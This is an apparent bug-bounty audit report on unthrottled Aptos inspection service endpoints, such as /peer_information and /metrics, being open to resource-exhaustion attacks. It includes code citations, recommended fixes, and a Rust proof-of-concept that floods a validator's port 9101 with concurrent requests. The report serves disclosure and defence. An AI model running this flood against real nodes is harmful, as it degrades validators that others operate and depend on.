# Audit Report

## Title
Resource Exhaustion via Unthrottled Inspection Service Endpoints

## Summary
The Aptos inspection service handles HTTP requests asynchronously without implementing rate limiting or per-request timeouts. Expensive operations such as gathering peer information and metrics can be triggered repeatedly by an attacker with network access, potentially causing CPU and memory exhaustion on validator nodes.

## Finding Description

The `serve_requests()` function in the inspection service processes each incoming HTTP request asynchronously without any rate limiting, connection limits, or per-request timeouts at the application layer. [1](#0-0) 

The service exposes several endpoints that perform computationally expensive operations:

**1. `/peer_information` endpoint** - This endpoint gathers comprehensive peer data by iterating over all connected peers multiple times (6+ iterations through the peer list): [2](#0-1) 

Each request performs multiple expensive operations including retrieving all peers, sorting them, and gathering metadata from various sources: [3](#0-2) 

**2. `/metrics` and `/json_metrics` endpoints** - These gather all Prometheus metrics from the global registry, which can include thousands of metric families: [4](#0-3) 

The code even warns about metric families exceeding 2000 dimensions, indicating the scale of data being processed.

**Attack Scenario:**

An attacker who gains network access to port 9101 (through internal network compromise, pod-to-pod communication in Kubernetes, or service misconfiguration) can:

1. Send hundreds of concurrent requests to `/peer_information` or `/metrics` endpoints
2. Each request spawns an async task that processes all peer data or metrics
3. With ~100-150 validators (typical) and 6+ iterations per request, a single request performs 600+ peer lookups plus JSON serialization
4. 100 concurrent requests = 60,000+ peer data operations plus massive memory allocation for response building
5. Without timeouts, slow operations continue consuming resources
6. CPU exhaustion occurs from concurrent processing of expensive operations
7. Memory exhaustion from building large response payloads simultaneously

**Infrastructure Context:**

The codebase includes a rate limiting library (`aptos-rate-limiter`) with token bucket implementation, but the inspection service does not utilize it: [5](#0-4) 

The inspection service configuration lacks rate limiting parameters: [6](#0-5) 

While HAProxy provides some protection (maxconn 500, maxconnrate 300), these limits are still high enough to enable resource exhaustion, and they only apply when traffic routes through HAProxy: [7](#0-6) 

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under the Aptos bug bounty program for the following reasons:

**Validator Node Performance Degradation**: Sustained requests to expensive endpoints can slow down validator nodes by consuming CPU cycles and memory that should be dedicated to consensus participation, transaction processing, and block production. While the node won't crash or lose consensus safety, performance degradation could cause validators to lag behind in rounds or miss block proposals.

**Not High Severity**: This does not constitute total network unavailability or API crashes. Validators remain operational, just degraded. HAProxy provides baseline protection against the most extreme scenarios.

**Not Critical Severity**: No loss of funds, consensus safety violations, or permanent network damage occurs. The issue is recoverable by restarting the service or blocking malicious sources.

The impact aligns with Medium severity: "State inconsistencies requiring intervention" - administrators would need to intervene to block attack sources and potentially restart affected nodes to restore full performance.

## Likelihood Explanation

**Likelihood: Medium**

**Access Requirements:**
- Attacker needs network connectivity to port 9101
- Default Docker deployments bind to localhost only (127.0.0.1), providing strong protection
- Kubernetes deployments use NetworkPolicy to restrict access to HAProxy, monitoring, and health-checker pods
- However, internal network compromise, pod-to-pod attacks in Kubernetes, or misconfiguration exposing the port to broader networks make exploitation feasible

**Attack Complexity:** 
- Low - Simple HTTP flood with tools like `curl` or custom scripts
- No authentication required on the inspection service endpoints
- Operations are synchronously expensive, amplifying attacker impact

**Mitigating Factors:**
- HAProxy provides connection rate limiting (300 conn/sec) and total connection limits (500 concurrent)
- Default configurations restrict network exposure
- Monitoring systems would likely detect unusual traffic patterns

**Aggravating Factors:**
- No application-layer rate limiting or circuit breakers
- No per-request timeout enforcement
- Maximum validator set size of 65,536 theoretically allows for much more expensive operations than current ~100-150 validators
- Service enabled by default on validators

## Recommendation

Implement defense-in-depth protections at the application layer:

**1. Add Rate Limiting** using the existing `aptos-rate-limiter` infrastructure:

```rust
use aptos_rate_limiter::rate_limit::TokenBucketRateLimiter;

// In InspectionServiceConfig
pub struct InspectionServiceConfig {
    pub address: String,
    pub port: u16,
    // Add rate limiting configuration
    pub max_requests_per_second: u64,
    pub max_concurrent_requests: usize,
    pub expose_configuration: bool,
    pub expose_identity_information: bool,
    pub expose_peer_information: bool,
    pub expose_system_information: bool,
}

impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            max_requests_per_second: 10,
            max_concurrent_requests: 50,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
}
```

**2. Add Per-Request Timeout** using tokio::time::timeout:

```rust
async fn serve_requests(
    req: Request<Body>,
    node_config: NodeConfig,
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) -> Result<Response<Body>, hyper::Error> {
    // Wrap request processing with timeout
    let timeout_duration = Duration::from_secs(10);
    
    let result = tokio::time::timeout(
        timeout_duration,
        process_request(req, node_config, aptos_data_client, peers_and_metadata)
    ).await;
    
    match result {
        Ok(response) => response,
        Err(_) => {
            // Timeout occurred
            Ok(Response::builder()
                .status(StatusCode::REQUEST_TIMEOUT)
                .body(Body::from("Request timeout"))
                .unwrap())
        }
    }
}
```

**3. Add Connection Limiting** at the Hyper server level:

```rust
let server = Server::bind(&address)
    .http1_max_buf_size(8192)
    .serve(make_service);
```

**4. Consider binding to localhost by default** in production validator configurations:

```yaml
inspection_service:
  address: "127.0.0.1"  # Instead of "0.0.0.0"
  port: 9101
```

## Proof of Concept

The following Rust code demonstrates how an attacker could exploit this vulnerability:

```rust
use tokio::runtime::Runtime;
use std::time::{Duration, Instant};

#[tokio::main]
async fn main() {
    let target = "http://validator-node:9101";
    let num_concurrent = 100;
    let num_rounds = 10;
    
    println!("Starting DoS test against inspection service...");
    println!("Target: {}", target);
    println!("Concurrent requests: {}", num_concurrent);
    
    for round in 1..=num_rounds {
        let start = Instant::now();
        
        // Spawn concurrent requests to expensive endpoints
        let mut handles = vec![];
        
        for _ in 0..num_concurrent {
            let target_clone = target.to_string();
            let handle = tokio::spawn(async move {
                // Send request to expensive peer_information endpoint
                let client = reqwest::Client::new();
                let result = client
                    .get(&format!("{}/peer_information", target_clone))
                    .send()
                    .await;
                    
                match result {
                    Ok(resp) => {
                        println!("Response status: {}", resp.status());
                        // Force download entire response to maximize resource usage
                        let _ = resp.text().await;
                    }
                    Err(e) => println!("Request failed: {}", e),
                }
            });
            handles.push(handle);
        }
        
        // Wait for all requests to complete
        for handle in handles {
            let _ = handle.await;
        }
        
        let elapsed = start.elapsed();
        println!("Round {} completed in {:?}", round, elapsed);
        println!("Average request time: {:?}", elapsed / num_concurrent);
        
        // Brief pause between rounds
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    
    println!("DoS test completed. Monitor validator CPU/memory usage.");
}
```

**Expected Behavior:** 
- Validator node CPU usage spikes to 80-100%
- Memory consumption increases significantly as response buffers accumulate
- Legitimate monitoring requests experience delays
- Validator may lag in consensus rounds during the attack

**Notes:**
- This PoC assumes the attacker has network access to port 9101
- In default deployments, this requires internal network access or misconfiguration
- Real attack would sustain the load longer than 10 rounds
- Metrics endpoints (`/metrics`, `/json_metrics`) are equally vulnerable

### Citations

**File:** crates/aptos-inspection-service/src/server/mod.rs (L104-109)
```rust
async fn serve_requests(
    req: Request<Body>,
    node_config: NodeConfig,
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) -> Result<Response<Body>, hyper::Error> {
```

**File:** crates/aptos-inspection-service/src/server/peer_information.rs (L41-106)
```rust
fn get_peer_information(
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) -> String {
    // Get all registered networks
    let registered_networks: Vec<NetworkId> =
        peers_and_metadata.get_registered_networks().collect();

    // Get all peers (sorted by peer ID)
    let mut all_peers = peers_and_metadata.get_all_peers();
    all_peers.sort();

    // Display a summary of all peers and networks
    let mut peer_information_output = Vec::<String>::new();
    display_peer_information_summary(
        &mut peer_information_output,
        &all_peers,
        &registered_networks,
    );
    peer_information_output.push("\n".into());

    // Display connection metadata for each peer
    display_peer_connection_metadata(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display the entire set of trusted peers
    display_trusted_peers(
        &mut peer_information_output,
        registered_networks,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display basic peer metadata for each peer
    display_peer_monitoring_metadata(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display state sync metadata for each peer
    display_state_sync_metadata(&mut peer_information_output, &all_peers, aptos_data_client);
    peer_information_output.push("\n".into());

    // Display detailed peer metadata for each peer
    display_detailed_monitoring_metadata(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display the internal client state for each peer
    display_internal_client_state(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );

    peer_information_output.join("\n") // Separate each entry with a newline to construct the output
}
```

**File:** crates/aptos-inspection-service/src/server/peer_information.rs (L236-270)
```rust
    // Fetch and display the state sync metadata for each peer
    let peer_to_state = aptos_data_client.get_peer_states().get_peer_to_states();
    for peer in all_peers {
        if let Some(peer_state_entry) = peer_to_state.get(peer) {
            // Get the peer states
            let peer = *peer_state_entry.key();
            let peer_bucket_id = peer_states::get_bucket_id_for_peer(peer);
            let peer_score = peer_state_entry.get_score();
            let peer_storage_summary = peer_state_entry.get_storage_summary();

            // Display the peer states
            peer_information_output.push(format!(
                "\t- Peer: {}, score: {}, bucket ID: {}",
                peer, peer_score, peer_bucket_id
            ));
            peer_information_output.push(format!(
                "\t\t- Advertised storage summary: {:?}",
                peer_storage_summary
            ));

            // Get the peer's request/response counts
            let sent_requests_by_type = peer_state_entry.get_sent_requests_by_type();
            let received_responses_by_type = peer_state_entry.get_received_responses_by_type();

            // Display the peer's request/response counts
            peer_information_output.push(format!(
                "\t\t- Sent requests by type: {:?}",
                sent_requests_by_type
            ));
            peer_information_output.push(format!(
                "\t\t- Received responses by type: {:?}",
                received_responses_by_type
            ));
        }
    }
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L50-79)
```rust
fn get_metric_families() -> Vec<MetricFamily> {
    let metric_families = aptos_metrics_core::gather();
    let mut total: u64 = 0;
    let mut families_over_2000: u64 = 0;

    // Take metrics of metric gathering so we know possible overhead of this process
    for metric_family in &metric_families {
        let family_count = metric_family.get_metric().len();
        if family_count > 2000 {
            families_over_2000 = families_over_2000.saturating_add(1);
            let name = metric_family.get_name();
            warn!(
                count = family_count,
                metric_family = name,
                "Metric Family '{}' over 2000 dimensions '{}'",
                name,
                family_count
            );
        }
        total = total.saturating_add(family_count as u64);
    }

    // These metrics will be reported on the next pull, rather than create a new family
    NUM_METRICS.with_label_values(&["total"]).inc_by(total);
    NUM_METRICS
        .with_label_values(&["families_over_2000"])
        .inc_by(families_over_2000);

    metric_families
}
```

**File:** crates/aptos-rate-limiter/src/rate_limit.rs (L14-50)
```rust
/// A generic token bucket filter
///
/// # Terms
/// ## Key
/// A `key` is an identifier of the item being rate limited
///
/// ## Token
/// A `token` is the smallest discrete value that we want to rate limit by.  In a situation involving
/// network requests, this may represent a request or a byte.  `Tokens` are the counters for the
/// rate limiting, and when there are no `tokens` left in a `bucket`, the `key` is throttled.
///
/// ## Bucket
/// A `bucket` is the tracker of the number of `tokens`.  It has a `bucket size`, and any additional
/// tokens added to it will "spill" out of the `bucket`.  The `buckets` are filled at an `interval`
/// with a given `fill rate`.
///
/// ## Interval
/// The `interval` at which we refill *all* of the `buckets` in the token bucket filter. Configured
/// across the whole token bucket filter.
///
/// ## Fill Rate
/// The rate at which we fill a `bucket` with tokens. Configured per bucket.
///
/// ## Bucket Size
/// Maximum size of a bucket.  A bucket saturates at this size.  Configured per bucket.
///
/// # Features
/// ## Keys
/// The token bucket takes any key as long as it's hashable.  This should allow it to apply to
/// many applications that need rate limiters.
///
/// ## Bucket sizes and Rates
/// ### Defaults
/// There are defaults for bucket size and fill rate, which will apply to unknown keys.
///
/// ### Refill Interval
/// Buckets are refilled automatically at an interval.  To do this synchronously, it calculates the
```

**File:** config/src/config/inspection_service_config.rs (L15-24)
```rust
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct InspectionServiceConfig {
    pub address: String,
    pub port: u16,
    pub expose_configuration: bool,
    pub expose_identity_information: bool,
    pub expose_peer_information: bool,
    pub expose_system_information: bool,
}
```

**File:** docker/compose/aptos-node/haproxy.cfg (L8-12)
```text
    # Limit the maximum number of connections to 500 (this is ~5x the validator set size)
    maxconn 500

    # Limit the maximum number of connections per second to 300 (this is ~3x the validator set size)
    maxconnrate 300
```
